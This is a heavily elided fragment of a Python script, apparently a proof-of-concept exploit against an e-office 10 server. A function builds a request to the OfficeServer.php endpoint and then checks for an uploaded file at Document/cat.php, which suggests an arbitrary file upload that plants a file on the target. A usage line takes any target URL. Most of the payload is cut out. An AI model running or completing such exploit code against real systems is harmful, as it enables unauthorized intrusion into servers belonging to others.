...
def command(url):
    url1 = url + '/eoffice10/server/public/iWebOffice2015/OfficeServer.php'
    headers = {
    ...
    res = url+'/eoffice10/server/public/iWebOffice2015/Document/cat.php'
...
if __name__ == '__main__':
    try:
        ...
        print('help:    python eoffice10.py http://1.1.1.1')
